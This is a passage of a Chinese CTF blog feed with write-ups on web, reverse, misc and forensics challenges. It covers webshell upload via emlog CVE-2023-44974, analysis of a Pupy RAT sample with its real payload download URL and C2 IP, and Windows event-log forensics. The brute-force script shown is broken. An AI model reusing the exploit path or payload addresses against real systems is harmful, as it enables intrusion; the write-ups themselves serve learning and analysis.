        <content type="html"><![CDATA[<h1 id="2024ISG观安杯"><a href="#2024ISG观安杯" class="headerlink" title="2024ISG观安杯"></a>2024ISG观安杯</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="R-emm-w3nx1z1"><a href="#R-emm-w3nx1z1" class="headerlink" title="R | emm | w3nx1z1"></a>R | emm | w3nx1z1</h3><p>前面就是正常的随便输入用户密码邮箱 进行安装 然后登陆后台</p><p>找到一个emlog的任意文件上传漏洞CVE-2023-44974</p><p>在插件处上传webshell压缩包 要求是文件夹要和webshell的名字相同 可以用这个里面的</p><p><a href="https://github.com/yangliukk/emlog/tree/main">https://github.com/yangliukk/emlog/tree/main</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351954.png" alt="img"></p><p>然后访问webshell 执行命令 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351339.png" alt="img"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="R-rev-shell-解题人"><a href="#R-rev-shell-解题人" class="headerlink" title="R | rev_shell | 解题人"></a>R | rev_shell | 解题人</h3><p>先看日志文件</p><p>跑一下程序对照，拿到cipher和key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351776.png" alt="img"></p><p>再看可执行文件</p><p>die查壳</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351453.png" alt="img"></p><p>upx壳，工具脱不了，一开始以为是工具版本的问题，后来发现github最新版是4.2.4，但是题目是4.3，猜测可能是魔改？</p><p>再尝试下断点手脱，但是报错</p><p>再尝试直接跑起来attach，成功附加但是没dump下来，堵死</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351139.png" alt="img"></p><p>最后尝试直接爆破，先测试出明文长度37</p><p>大小写字母数字以及下划线组合，找pwn手from pwn写按位爆破脚本</p><pre><code class="Python">from struct import packfrom ctypes import *from LibcSearcher import *from pwn import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)#context(arch=&#39;i386&#39;,log_level=&#39;debug&#39;)def s(a):    io.send(a)    def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r():    io.recv()def pr():    print(io.recv())def rl(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def ret_csu(r12, r13, r14, r15, last):    payload = offset * &#39;a&#39;    #构造栈溢出的padding    payload += p64(gadget1)    #gadgets1的地址    payload += p64(0) + p64(1)    #rbx=0, rbp=1    payload += p64(r12)    #call调用的地址    payload += p64(r13) + p64(r14) + p64(r15)    #三个参数的寄存器    payload += p64(gadget2)    #gadgets2的地址    payload += &#39;a&#39; * 56    #pop出的padding    payload += p64(last)    #函数最后的返回地址    return payloadio=process(&#39;./encsh&#39;)#io=remote(&#39;&#39;,)#elf=ELF(&#39;./&#39;)#libc=ELF(&#39;./&#39;)import stringkey = &#39;mykeymykeyhackergoawayyourkeyyou&#39;flag = &#39;00000000000000000000000000000000000000000000000000000&#39;v = [227, 83, 162, 17, 197, 102, 127, 119, 94, 208, 82, 187, 221, 191, 112, 186, 0, 170, 191, 44, 233, 242, 209, 114,     70, 116, 203, 80, 72, 65, 254, 111, 119, 146, 95, 180, 182, 77, 140, 110, 204, 249, 76, 34, 229, 39, 30, 12, 248,     89, 158, 103, 170]FLAG = &#39;&#39;sla(&#39;&gt;&#39;, &#39;key&#39;)sl(key)sla(&#39;&gt;&#39;, &#39;enc&#39;)sl(flag)rl(&#39;[&#39;)ans = rl(&#39;]&#39;).decode()temp = ans[:-1].split(&#39;, &#39;)tmp = int(temp[i])for i in range(len(v)):    for j in string.printable:        ans = flag[:i] + j + flag[i + 1:]        S(ans)        if tmp == v[i]:            FLAG += j            break        print(FLAG)        io.close()ISG&#123;ThIsisMYuPx_notYOuR5_Gg_hjD95wk1&#125;</code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="R-office-w3nx1z1"><a href="#R-office-w3nx1z1" class="headerlink" title="R | office | w3nx1z1"></a>R | office | w3nx1z1</h3><p>010打开 末尾base64 解密得到用来打开excel文档的密码</p><pre><code class="Python">SSN6aVR4bnh2YmcjR0M5   I#ziTxnxvbg#GC9</code></pre><p>打开之后发现有宏vba </p><p><img src="https://uvlucnh8giw.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQ2M2ZjYzM3YWNhZDUzMDEwNDA3MDdmMzZiNDQ0MGZfZ3NnNExDYzlHWjBEOWZmR1BpZ2U4V21QeDR6T0E3T1JfVG9rZW46TVdub2JZS1A4b2FpQWJ4bHZ0ZGNSOGRIbnJnXzE3MjQxMzMwNjE6MTcyNDEzNjY2MV9WNA" alt="img"></p><p>尝试编辑宏 发现有保护密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351075.png" alt="img"></p><p>使用LibreOffice Calc打开可以消除宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351991.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351459.png" alt="img"></p><p>写解密脚本 恢复flag</p><pre><code class="Python">def decrypt(encrypted_message):    # 将加密字符串分割成整数字符串，并去除空字符串    message_parts = [int(part) for part in encrypted_message.split(&#39;,&#39;) if part]    # 初始化 S 数组    s = list(range(256))    j = 0    # 创建 KSA    for i in range(256):        j = (j + s[i]) % 256        s[i], s[j] = s[j], s[i]    # 初始化 x 和 y    x = 0    y = 0    decrypted_message = &quot;&quot;    # 进行解密    for i in range(len(message_parts)):        x = (x + 1) % 256        y = (y + s[x]) % 256        s[x], s[y] = s[y], s[x]                # 恢复原始字符        char = chr(s[(s[x] + s[y]) % 256] ^ message_parts[i])        decrypted_message += char    return decrypted_message# 测试代码if __name__ == &quot;__main__&quot;:    encrypted = &quot;184,116,232,38,216,127,29,89,225,84,108,82,8,0,161,49,232,127,45,252,147,140,185,210,26,107,123,2,82,189,0,167,205,130,94,54,94,242,138,139,102,79,250,139,9,142,17,42,198,113,246,6,142,31,&quot;        decrypted = decrypt(encrypted)    print(&quot;Decrypted Message:&quot;, decrypted)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201354481.png" alt="img"></p><h4 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h4><p>说一下另一种思路 直接在wps里面取消掉打开密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351237.png" alt="img"></p><p>密码加密里面删掉原来的密码——应用 再打开就没有密码了 olevba也可以正常使用了</p><pre><code class="Python">olevba problem.xlsm</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201354724.png" alt="img"></p><h4 id="另外2"><a href="#另外2" class="headerlink" title="另外2"></a>另外2</h4><p>还有一种消除宏保护密码的方法 在wps中另存为xls文档 使用010打开这个xls文档 找到DPB字段 改为DPX 就可以消除宏保护密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351876.png" alt="img"></p><h3 id="R-misc-see-it-w3nx1z1"><a href="#R-misc-see-it-w3nx1z1" class="headerlink" title="R | misc_see_it | w3nx1z1"></a>R | misc_see_it | w3nx1z1</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>t’s not what you hear, it’s what you see.</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>末尾压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201353878.png" alt="img"></p><p>提出来解压 得到密码 p@ssw0rd_1s_myg0 还有steghide字段提示</p><p>直接解密 得到png lsb隐写得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408201351366.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024巅峰极客-简历</title>
      <link href="/2024/08/17/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-%E7%AE%80%E5%8E%86/"/>
      <url>/2024/08/17/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-%E7%AE%80%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h1 id="2024巅峰极客-简历"><a href="#2024巅峰极客-简历" class="headerlink" title="2024巅峰极客-简历"></a>2024巅峰极客-简历</h1><p>很好的比赛 充分发扬py精神 最后半小时疯狂冲分</p><p>题的质量不错 算是学到了新的姿势 </p><p>给到附件是一个exe文件 用010看了一眼 全是upx 判断为有壳 用upx去一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172113204.png" alt="image-20240817211321811"></p><p>去壳之后跑了一下沙箱 发现没有毒</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172247872.png" alt="image-20240817224758718"></p><p>但是存在检测虚拟机 直接在本机运行一下 得到两个文件<code>my.png</code> 和<code>file</code> file文件其实就是一个exe可执行程序文件</p><p>再来分析my.png zsteg跑一下 发现存在lsb隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172250120.png" alt="image-20240817225025010"></p><p>得到一个链接</p><pre><code>http://47.104.129.38/79407f2309b5763fbd0e33dc583c4262/default.a</code></pre><p>访问可以下载<code>default.a</code>  使用010打开发现存在大量相同的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172251095.png" alt="image-20240817225152030"></p><p>猜测是要与yyttddd进行异或 写脚本完成</p><pre><code class="python">def xor_with_string(file_path, xor_string):    xor_bytes = xor_string.encode()    with open(file_path, &#39;rb&#39;) as file:        file_data = file.read()    xor_result = bytearray()    for i in range(len(file_data)):        xor_result.append(file_data[i] ^ xor_bytes[i % len(xor_bytes)])    return xor_resultdef save_xor_result(xor_result, output_path):    with open(output_path, &#39;wb&#39;) as output_file:        output_file.write(xor_result)file_path = &#39;default.a&#39;output_path = &#39;output_file.exe&#39; xor_string = &#39;yyttddd&#39;xor_result = xor_with_string(file_path, xor_string)save_xor_result(xor_result, output_path)print(output_path)</code></pre><p>导出发现其实就是运行附件exe程序时释放出来的file文件 在其中发现大量pupy字段的出现</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172306355.png" alt="image-20240817230639288"></p><p>搜索发现Pupy确实是一个C2项目</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172307939.png" alt="image-20240817230710822"></p><p>在github上找到解密项目 需要在python2的环境下运行</p><p><a href="https://github.com/CaledoniaProject/pupyrat-config-decoder">pupyrat配置解码器</a></p><p>直接运行发现报错 主要是第28行的问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172308298.png" alt="image-20240817230850198"></p><p>脚本问题无法进行反编译 那就直接输出解码后的结果tmp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172315087.png" alt="image-20240817231532915"></p><p>改为</p><pre><code>print(tmp)</code></pre><p>在kali中运行</p><pre><code>python2 main.py output_file.exe</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408172317112.png" alt="image-20240817231735979"></p><p>找到ip  <code>60.177.18.44</code> 进行md5加密</p><pre><code>flag&#123;b57758d5acc923137eef453239ba685b&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TFCCTF2024之forensics</title>
      <link href="/2024/08/04/TFCCTF%E4%B9%8Bforensics/"/>
      <url>/2024/08/04/TFCCTF%E4%B9%8Bforensics/</url>
      
        <content type="html"><![CDATA[<h1 id="TFCCTF2024之forensics"><a href="#TFCCTF2024之forensics" class="headerlink" title="TFCCTF2024之forensics"></a>TFCCTF2024之forensics</h1><p>发现最近的国际赛的取证真的好喜欢出evtx日志分析</p><p>这两道取证其实用的附件都是一样的</p><h2 id="SM-WHAT"><a href="#SM-WHAT" class="headerlink" title="SM WHAT?!"></a>SM WHAT?!</h2><pre><code>An attacker managed to gain foothold in our network, but we managed to capture the connection to our server. Analyze the file and identify the tool used to connect, the service it connected to, its IP address, and the shared resources folder.Flag format: TFCCTF&#123;tool_service_ip_share&#125;Example: TFCCTF&#123;ntlmrelayx_rdp_192.168.0.1_logs$&#125;Note: The flag is in all lowercase (except for TFCCTF).</code></pre><p>就是需要我们找连接服务器使用的工具 连接的服务名称 ip地址和共享资源文件夹的名字</p><p>首先 给我们的是一个evtx日志文件 我们先使用 <a href="https://github.com/williballenthin/python-evtx">python-evtx-master</a>这个项目 把evtx日志文件转化为更容易进行查看的xml文件 使用&#x2F;scripts文件夹下的<code>evtx_dump.py</code>  命令是</p><pre><code>python evtx_dump.py 1.evtx &gt; 1.xml</code></pre><p>然后我们找一下事件ID4688的记录 这个ID记录了进程创建的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040036715.png" alt="image-20240804003657504"></p><p>大致可以确定 ip是127.0.0.1 共享文件夹目录是ADMIN$ 题目要求是全小写 那就是admin$</p><p>后面直接在github里面搜上面这部分的源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040039357.png" alt="image-20240804003943104"></p><p>根据这个文件名<code>ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).xml</code> 在搜一下<code>wmiexec </code> 是一种内网横向的工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040041053.png" alt="image-20240804004110988"></p><p>那可以确定工具是wmiexec 服务就是smb</p><p>所以flag是</p><pre><code>TFCCTF&#123;wmiexec _smb_127.0.0.1_admin$&#125;</code></pre><h2 id="HE-DID-WHAT"><a href="#HE-DID-WHAT" class="headerlink" title="HE DID WHAT?!"></a>HE DID WHAT?!</h2><pre><code>After the attacker connected to our server, he managed to extract some random data, however encrypted. We trust to decrypt it and get the flag.</code></pre><p>要找一个加密的字符串 </p><p>在事件ID4104处找到一个reverse过的base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040044453.png" alt="image-20240804004413308"></p><p>是一个powershell的命令 里面还有个base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040044690.png" alt="image-20240804004436580"></p><p>解出来是个url 上一条的命令就是先对这个url进行base64解密 解出来后 再从这个url中下载<code>caca.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040045658.png" alt="image-20240804004534550"></p><p>我们也访问这个url 下载到<code>caca.exe </code> 直接用ida打开报错 用DIE查了一下 是.net的程序 用dnspy打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040047115.png" alt="image-20240804004719038"></p><p>右键<code>caca</code> 点击转到入口点 就可以查看到主函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040047399.png" alt="image-20240804004758268"></p><p>一个C#的程序  主要功能就是将一个字符串的每个字符的ascii码值都+2 再转字符输出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040048567.png" alt="image-20240804004832455"></p><p>我们现在就找他对应的这个密文在哪里  直接在源码里面搜<code>caca.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040050633.png" alt="image-20240804005016556"></p><p>找到密文</p><pre><code>VHEEVH&#125;x3uwcnad6u3eac3pvaj6tf</code></pre><p>写个脚本 跑出结果 后面补个<code>&#125;</code>就行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040051830.png" alt="image-20240804005102737"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024中科实数杯wp</title>
      <link href="/2024/07/26/2024%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AFwp/"/>
      <url>/2024/07/26/2024%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2024中科实数杯wp"><a href="#2024中科实数杯wp" class="headerlink" title="2024中科实数杯wp"></a>2024中科实数杯wp</h1><h2 id="鉴定材料"><a href="#鉴定材料" class="headerlink" title="鉴定材料"></a>鉴定材料</h2><pre><code>1、犯罪嫌疑人张老四的 iphone 手机备份一个；2、犯罪嫌疑人王胖子的安卓手机备份一个；3、犯罪窝点起获的 windows 笔记本电脑 A 镜像一个；4、犯罪窝点起获的 macbook 笔记本电脑 B 镜像一个；5、犯罪窝点笔记本电脑 A 内存镜像一份；6、后期归案的犯罪嫌疑人大金牙工作安卓手机备份一个；7、犯罪窝点的 u 盘镜像一个；8、后期归案的犯罪嫌疑人眼镜仔工作 iphone 手机备份一个</code></pre><h2 id="基本案情"><a href="#基本案情" class="headerlink" title="基本案情"></a>基本案情</h2><pre><code>  山西省公安机关接到线报，有一伙人长期从事盗墓和贩售文物活动，形成了一条龙的犯罪链条。经过数月侦察，警方掌握了该团伙的核心成员信息，并成功在一次交易中将多名嫌疑人抓获，现场扣押了大量文物及嫌疑人手机，并在突击审讯后在其老巢起获了多台笔记本电脑及电子存储设备。现需要对这些设备进行全面取证分析，以获得更多犯罪证据，彻底摧毁这一犯罪网络。</code></pre><h2 id="分析说明-WP部分"><a href="#分析说明-WP部分" class="headerlink" title="分析说明(WP部分)"></a>分析说明(WP部分)</h2><h3 id="1、检材-1-的手机序列号是？（1-分）"><a href="#1、检材-1-的手机序列号是？（1-分）" class="headerlink" title="1、检材 1-的手机序列号是？（1 分）"></a>1、检材 1-的手机序列号是？（1 分）</h3><pre><code>C39QTS9JGRX5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261036616.png" alt="image-20240715225805849"></p><h3 id="2、检材-1-的备份时间是？（格式：yyyy-mm-dd-HH-mm-ss）（2分）"><a href="#2、检材-1-的备份时间是？（格式：yyyy-mm-dd-HH-mm-ss）（2分）" class="headerlink" title="2、检材 1-的备份时间是？（格式：yyyy-mm-dd HH:mm:ss）（2分）"></a>2、检材 1-的备份时间是？（格式：yyyy-mm-dd HH:mm:ss）（2分）</h3><pre><code>2024-07-11 02:09:02</code></pre><p>接上题图</p><h3 id="3、检材-1-最近使用的-APP-是？（应用名称）（1-分）"><a href="#3、检材-1-最近使用的-APP-是？（应用名称）（1-分）" class="headerlink" title="3、检材 1-最近使用的 APP 是？（应用名称）（1 分）"></a>3、检材 1-最近使用的 APP 是？（应用名称）（1 分）</h3><pre><code>铛铛</code></pre><p>分析应用授权日志 发现最近的授权记录应用是铛铛</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261100613.png" alt="image-20240715225805849"></p><h3 id="4、检材-2-即时聊天工具有哪些？（2-分）"><a href="#4、检材-2-即时聊天工具有哪些？（2-分）" class="headerlink" title="4、检材 2-即时聊天工具有哪些？（2 分）"></a>4、检材 2-即时聊天工具有哪些？（2 分）</h3><pre><code>城信、铛铛、QQ、MOMO陌陌</code></pre><p>直接查看apk列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261106418.png" alt="image-20240715225805849"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261106520.png" alt="image-20240715225805849"></p><p>搜了一下铛铛和城信 发现也是即时通讯app</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261107456.png" alt="image-20240715225805849"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261107649.png" alt="image-20240715225805849"></p><h3 id="5、检材-2-盗墓团伙之间的通讯-APP-版本是多少？（格式：x-x-x）"><a href="#5、检材-2-盗墓团伙之间的通讯-APP-版本是多少？（格式：x-x-x）" class="headerlink" title="5、检材 2-盗墓团伙之间的通讯 APP 版本是多少？（格式：x.x.x）"></a>5、检材 2-盗墓团伙之间的通讯 APP 版本是多少？（格式：x.x.x）</h3><pre><code>3.0.36</code></pre><p>直接从分析结果中看到的QQ和陌陌中并没有关于盗墓的聊天记录 那就手动分析一下其他两个通讯app 先看铛铛</p><p>找到聊天记录数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261720314.png" alt="image-20240715225805849"></p><p>导出 使用navicat分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261720094.png" alt="image-20240715225805849"></p><p>发现聊天内容与盗墓有关 再查看铛铛的应用版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261724016.png" alt="image-20240715225805849"></p><h3 id="6、检材-2-盗墓团伙抱怨的工具有哪些（2-分）"><a href="#6、检材-2-盗墓团伙抱怨的工具有哪些（2-分）" class="headerlink" title="6、检材 2-盗墓团伙抱怨的工具有哪些（2 分）"></a>6、检材 2-盗墓团伙抱怨的工具有哪些（2 分）</h3><pre><code>铲子、绳子、电筒、指南针</code></pre><p>接上题图 根据聊天内容语境 可以判断 抱怨的工具有铲子 绳子 电筒 指南针</p><h3 id="7-7、检材-2-盗墓团伙之间的通讯-APP-证书指纹-SHA256-值是多少？（格式：xx-xx…或-xxxx…）（5-分）"><a href="#7-7、检材-2-盗墓团伙之间的通讯-APP-证书指纹-SHA256-值是多少？（格式：xx-xx…或-xxxx…）（5-分）" class="headerlink" title="7.7、检材 2-盗墓团伙之间的通讯 APP 证书指纹 SHA256 值是多少？（格式：xx:xx…或 xxxx…）（5 分）"></a>7.7、检材 2-盗墓团伙之间的通讯 APP 证书指纹 SHA256 值是多少？（格式：xx:xx…或 xxxx…）（5 分）</h3><pre><code>f6605feeee5844b40d457652f0fe8a54ae237f745ff82131bafd196cfa3e17af</code></pre><p>直接在文件系统中找到铛铛的apk文件 导出后使用雷电进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262245440.png" alt="image-20240726224515201"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262247997.png" alt="image-20240726224757683"></p><h3 id="8、检材-3-硬盘的-MD5-值（1-分）"><a href="#8、检材-3-硬盘的-MD5-值（1-分）" class="headerlink" title="8、检材 3-硬盘的 MD5 值（1 分）"></a>8、检材 3-硬盘的 MD5 值（1 分）</h3><pre><code>01A2CDF623353043053ED37A7519265B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262319174.png" alt="image-20240726231908114"></p><h3 id="9、检材-3-硬盘系统分区的起始位置（1-分）"><a href="#9、检材-3-硬盘系统分区的起始位置（1-分）" class="headerlink" title="9、检材 3-硬盘系统分区的起始位置（1 分）"></a>9、检材 3-硬盘系统分区的起始位置（1 分）</h3><pre><code>344,981,504</code></pre><p>检材3 windows计算机的C盘存在bitlocker加密 这里提供几种解密方法</p><h4 id="一、取证大师小程序"><a href="#一、取证大师小程序" class="headerlink" title="一、取证大师小程序"></a>一、取证大师小程序</h4><p>因为这里给我们提供了计算机的内存镜像 取证大师内存取证小程序可以直接从里面提取出bitlocker解密密钥文件 但是这个缺点是这个密钥文件只能在取证大师中使用 火眼是用不了的</p><p>路径是</p><pre><code>E:\取证大师\FMP\Tools\FmScript\Scripts\Extends\内存镜像解析工具-专业版\x64\result\DC8D8739C6803B6407505CACA7D45FBB.KeyFile</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262255040.png" alt="image-20240726225542949"></p><p>直接在取证大师中导入就可以使用</p><h4 id="二、passwarekit爆破密钥"><a href="#二、passwarekit爆破密钥" class="headerlink" title="二、passwarekit爆破密钥"></a>二、passwarekit爆破密钥</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262256660.png" alt="image-20240726225639580"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262257624.png" alt="image-20240726225713549"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262256656.png" alt="image-20240726225618512"></p><p>爆破出恢复密钥是</p><pre><code>010461-617507-553498-499752-253286-356334-124773-180169</code></pre><p>将这个恢复密钥导入到火眼或者取证大师中都可以进行bitlocker解密</p><h4 id="三、生成去掉bitlocker加密的镜像"><a href="#三、生成去掉bitlocker加密的镜像" class="headerlink" title="三、生成去掉bitlocker加密的镜像"></a>三、生成去掉bitlocker加密的镜像</h4><p>在使用passwarekit爆破结束之后 会生成一个C盘已经去掉bitlocker加密的镜像 也可以在拿这个镜像进行取证分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262258338.png" alt="image-20240726225834250"></p><p>在解开bitlocker加密之后 就可以对检材3进行正常的一套分析 </p><p>系统分区的起始位置 其实问的就是C盘的起始位置 也有很多方法</p><h4 id="火眼"><a href="#火眼" class="headerlink" title="火眼"></a>火眼</h4><p>火眼里面提供的是起始扇区 记得要乘上512</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262308997.png" alt="image-20240726230803877"></p><h4 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262309166.png" alt="image-20240726230927045"></p><h4 id="证据文件硬盘信息小程序"><a href="#证据文件硬盘信息小程序" class="headerlink" title="证据文件硬盘信息小程序"></a>证据文件硬盘信息小程序</h4><p>这是取证大师中的小程序 比较方便 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262310567.png" alt="image-20240726231021502"></p><h3 id="10、检材-3-系统的当前版本是多少（1-分）"><a href="#10、检材-3-系统的当前版本是多少（1-分）" class="headerlink" title="10、检材 3-系统的当前版本是多少（1 分）"></a>10、检材 3-系统的当前版本是多少（1 分）</h3><pre><code>10</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262314344.png" alt="image-20240726231408284"></p><h3 id="11、检材-3-Edge-浏览器最后一次搜索过的关键词是什么（1-分）"><a href="#11、检材-3-Edge-浏览器最后一次搜索过的关键词是什么（1-分）" class="headerlink" title="11、检材 3-Edge 浏览器最后一次搜索过的关键词是什么（1 分）"></a>11、检材 3-Edge 浏览器最后一次搜索过的关键词是什么（1 分）</h3><pre><code>狼眼手电</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262316369.png" alt="image-20240726231657231"></p><h3 id="12、检材-3-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站-URL（1-分）"><a href="#12、检材-3-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站-URL（1-分）" class="headerlink" title="12、检材 3-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站 URL（1 分）"></a>12、检材 3-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站 URL（1 分）</h3><pre><code>https://baijiahao.baidu.com/s?id=1599783184726705131</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262318598.png" alt="image-20240726231822487"></p><h3 id="13、检材-3-主用户的-NT-密码哈希值（2-分）"><a href="#13、检材-3-主用户的-NT-密码哈希值（2-分）" class="headerlink" title="13、检材 3-主用户的 NT 密码哈希值（2 分）"></a>13、检材 3-主用户的 NT 密码哈希值（2 分）</h3><pre><code>a0bad269b8d49ccf481513f9875be4c7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262319522.png" alt="image-20240726231947389"></p><h3 id="14、检材-4-Mac-OS-的版本号（格式：x-x-x）（1-分）"><a href="#14、检材-4-Mac-OS-的版本号（格式：x-x-x）（1-分）" class="headerlink" title="14、检材 4-Mac OS 的版本号（格式：x.x.x）（1 分）"></a>14、检材 4-Mac OS 的版本号（格式：x.x.x）（1 分）</h3><pre><code>12.7.5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262320049.png" alt="image-20240726232033922"></p><h3 id="15、检材-4-加密货币软件的名字（1-分）"><a href="#15、检材-4-加密货币软件的名字（1-分）" class="headerlink" title="15、检材 4-加密货币软件的名字（1 分）"></a>15、检材 4-加密货币软件的名字（1 分）</h3><pre><code>OKX</code></pre><p>对检材4macbook 笔记本进行仿真  看到桌面有一个OKX网页 访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407270024871.png" alt="image-20240727002455686"></p><h3 id="16、检材-4-Safari-浏览器最后一次搜索过的关键词是什么（1-分）"><a href="#16、检材-4-Safari-浏览器最后一次搜索过的关键词是什么（1-分）" class="headerlink" title="16、检材 4-Safari 浏览器最后一次搜索过的关键词是什么（1 分）"></a>16、检材 4-Safari 浏览器最后一次搜索过的关键词是什么（1 分）</h3><pre><code>洛阳铲</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407270031737.png" alt="image-20240727003105510"></p><h3 id="17、检材-4-MacBook-pro-最后一次访问的文件名（2-分）"><a href="#17、检材-4-MacBook-pro-最后一次访问的文件名（2-分）" class="headerlink" title="17、检材 4-MacBook pro 最后一次访问的文件名（2 分）"></a>17、检材 4-MacBook pro 最后一次访问的文件名（2 分）</h3><pre><code>提示.doc</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301726152.png" alt="image-20240730172608015"></p><h3 id="18、检材-4-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站（2-分）"><a 